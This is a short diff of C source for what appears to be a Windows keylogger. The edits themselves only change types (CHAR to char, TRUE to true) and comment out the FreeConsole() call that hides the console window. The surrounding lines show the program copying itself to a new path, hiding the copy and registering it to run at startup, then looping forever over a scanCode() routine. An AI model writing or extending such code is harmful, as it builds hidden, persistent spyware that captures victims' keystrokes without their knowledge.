@@ -6,10 +6,10 @@
 #include "setup.h"
 
 int main(int argc, char **argv){
-    CHAR currPath[LEN_VALUE_NAME];
-    CHAR newPath[LEN_VALUE_NAME];
-    CHAR *nameProg = NULL;
-    FreeConsole();
+    char currPath[LEN_VALUE_NAME];
+    char newPath[LEN_VALUE_NAME];
+    char *nameProg = NULL;
+    //FreeConsole();
     memset(&currPath, '\0', LEN_VALUE_NAME);
     memset(&newPath, '\0', LEN_VALUE_NAME);
     GetModuleFileName(0, currPath, LEN_VALUE_NAME);
@@ -22,7 +22,7 @@ int main(int argc, char **argv){
             setHidden(newPath);
             setAutoRun(newPath, nameProg);
         }
-        while(TRUE){
+        while(true){
             scanCode();
         }
     }
